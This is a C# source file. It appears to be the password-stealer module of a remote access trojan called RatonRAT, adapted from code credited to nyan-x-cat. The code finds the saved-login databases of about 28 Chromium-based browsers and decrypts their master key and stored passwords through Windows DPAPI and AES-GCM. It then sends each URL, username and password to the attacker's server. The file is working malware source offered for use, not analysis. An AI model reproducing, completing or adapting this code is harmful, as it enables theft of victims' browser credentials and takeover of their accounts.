using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Client.Configuration.Passwords;
using Client.Connection;
using Client.Things;
using Stuff;
// By nyan-x-cat
// This is a edited version adapted to RatonRAT
namespace Client.Handlers
{
    public class HandlePass
    {
        public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static StringBuilder Steal(StringBuilder stringBuilder)
        {
            Dictionary<string, string> Paths = new Dictionary<string, string>()
            {
                {
                    "Chrome",
                    LocalApplicationData + @"\Google\Chrome\User Data"
                },
                {
                    "Opera",
                    Path.Combine(ApplicationData, @"Opera Software\Opera Stable")
                },
                {
                    "Yandex",
                    Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data")
                },
                {
                    "360 Browser",
                    LocalApplicationData + @"\360Chrome\Chrome\User Data"
                },
                {
                    "Comodo Dragon",
                    Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data")
                },
                {
                    "CoolNovo",
                    Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data")
                },
                {
                    "SRWare Iron",
                    Path.Combine(LocalApplicationData, @"Chromium\User Data")
                },
                {
                    "Torch Browser",
                    Path.Combine(LocalApplicationData, @"Torch\User Data")
                },
                {
                    "Brave Browser",
                    Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data")
                },
                {
                    "Iridium Browser",
                    LocalApplicationData + @"\Iridium\User Data"
                },
                {
                    "7Star",
                    Path.Combine(LocalApplicationData, @"7Star\7Star\User Data")
                },
                {
                    "Amigo",
                    Path.Combine(LocalApplicationData, @"Amigo\User Data")
                },
                {
                    "CentBrowser",
                    Path.Combine(LocalApplicationData, @"CentBrowser\User Data")
                },
                {
                    "Chedot",
                    Path.Combine(LocalApplicationData, @"Chedot\User Data")
                },
                {
                    "CocCoc",
                    Path.Combine(LocalApplicationData, @"CocCoc\Browser\User Data")
                },
                {
                    "Elements Browser",
                    Path.Combine(LocalApplicationData, @"Elements Browser\User Data")
                },
                {
                    "Epic Privacy Browser",
                    Path.Combine(LocalApplicationData, @"Epic Privacy Browser\User Data")
                },
                {
                    "Kometa",
                    Path.Combine(LocalApplicationData, @"Kometa\User Data")
                },
                {
                    "Orbitum",
                    Path.Combine(LocalApplicationData, @"Orbitum\User Data")
                },
                {
                    "Sputnik",
                    Path.Combine(LocalApplicationData, @"Sputnik\Sputnik\User Data")
                },
                {
                    "uCozMedia",
                    Path.Combine(LocalApplicationData, @"uCozMedia\Uran\User Data")
                },
                {
                    "Vivaldi",
                    Path.Combine(LocalApplicationData, @"Vivaldi\User Data")
                },
                {
                    "Sleipnir 6",
                    Path.Combine(ApplicationData, @"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
                },
                {
                    "Citrio",
                    Path.Combine(LocalApplicationData, @"CatalinaGroup\Citrio\User Data")
                },
                {
                    "Coowon",
                    Path.Combine(LocalApplicationData, @"Coowon\Coowon\User Data")
                },
                {
                    "Liebao Browser",
                    Path.Combine(LocalApplicationData, @"liebao\User Data")
                },
                {
                    "QIP Surf",
                    Path.Combine(LocalApplicationData, @"QIP Surf\User Data")
                },
                {
                    "Edge Chromium",
                    Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data")
                }
            };

            var list = new List<Account>();

            foreach (var item in Paths)
                list.AddRange(Accounts(item.Value, item.Key));

            stringBuilder.Clear();

            foreach (var b in list)
            {
                string entry = $"{b.URL}-=>{b.UserName}-=>{b.Password}-=>\n";
                stringBuilder.Append(entry);

                Pack pack = new Pack();
                pack.Set("Packet", "Password");
                pack.Set("UID", UID.Get());
                pack.Set("Passwords", entry);
                SillyClient.Send(pack.Pacc());
            }
            return stringBuilder;
        }

        private static List<Account> Accounts(string path, string browser, string table = "logins")
        {

            List<string> loginDataFiles = GetAllProfiles(path);

            List<Account> data = new List<Account>();

            foreach (string loginFile in loginDataFiles.ToArray())
            {
                if (!File.Exists(loginFile))
                    continue;

                SQLiteHandler SQLDatabase;

                try
                {
                    SQLDatabase = new SQLiteHandler(loginFile);
                }
                catch (Exception ex)
                {
                    Pack pack = new Pack();
                    pack.Set("Packet", "Error");
                    pack.Set("Error", ex.Message);
                    SillyClient.Send(pack.Pacc());
                    continue;
                }

                if (!SQLDatabase.ReadTable(table))
                    continue;

                for (int I = 0; I <= SQLDatabase.GetRowCount() - 1; I++)
                {
                    try
                    {
                        string host = SQLDatabase.GetValue(I, "origin_url");
                        string username = SQLDatabase.GetValue(I, "username_value");
                        string password = SQLDatabase.GetValue(I, "password_value");

                        if (password != null)
                        {
                            if (password.StartsWith("v10") || password.StartsWith("v11"))
                            {
                                byte[] masterKey = GetMasterKey(Directory.GetParent(loginFile).Parent.FullName);

                                if (masterKey == null)
                                    continue;

                                password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
                            }
                            else
                                password = Decrypt(password);
                        }
                        else
                            continue;

                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                            data.Add(new Account() { URL = host, UserName = username, Password = password });
                    }
                    catch (Exception ex)
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "Error");
                        pack.Set("Error", ex.Message);
                        SillyClient.Send(pack.Pacc());
                    }
                }
            }

            return data;
        }

        private static List<string> GetAllProfiles(string DirectoryPath)
        {
            List<string> loginDataFiles = new List<string>
            {
                DirectoryPath + @"\Default\Login Data",
                DirectoryPath + @"\Login Data"
            };

            if (Directory.Exists(DirectoryPath))
            {
                foreach (string dir in Directory.GetDirectories(DirectoryPath))
                {
                    if (dir.Contains("Profile"))
                        loginDataFiles.Add(dir + @"\Login Data");
                }
            }

            return loginDataFiles;
        }

        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
        {
            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };

            Array.Copy(encryptedData, 3, iv, 0, 12);

            try
            {
                byte[] Buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16];
                byte[] data = new byte[Buffer.Length - tag.Length];

                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);

                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);

                AesGcm aesDecryptor = new AesGcm();
                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));

                return result;
            }
            catch (Exception ex)
            {
                Pack pack = new Pack();
                pack.Set("Packet", "Error");
                pack.Set("Error", ex.Message);
                SillyClient.Send(pack.Pacc());
                return null;
            }
        }

        public static byte[] GetMasterKey(string LocalStateFolder)
        {
            string filePath = LocalStateFolder + @"\Local State";
            byte[] masterKey = new byte[] { };

            if (File.Exists(filePath) == false)
                return null;

            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));

            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }

            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public static string Decrypt(string encryptedData)
        {
            if (encryptedData == null || encryptedData.Length == 0)
                return null;
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser));
            }
            catch (Exception ex)
            {
                Pack pack = new Pack();
                pack.Set("Packet", "Error");
                pack.Set("Error", ex.ToString());
                SillyClient.Send(pack.Pacc());
                return null;
            }
        }

        private string[] GetAppDataFolders()
        {
            List<string> list = new List<string>();
            string[] directories = Directory.GetDirectories(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\", "*", SearchOption.TopDirectoryOnly);
            for (int i = 0; i < directories.Length; i++)
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(directories[i]);
                list.Add(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\" + directoryInfo.Name + "\\AppData");
            }
            return list.ToArray();
        }
    }
}
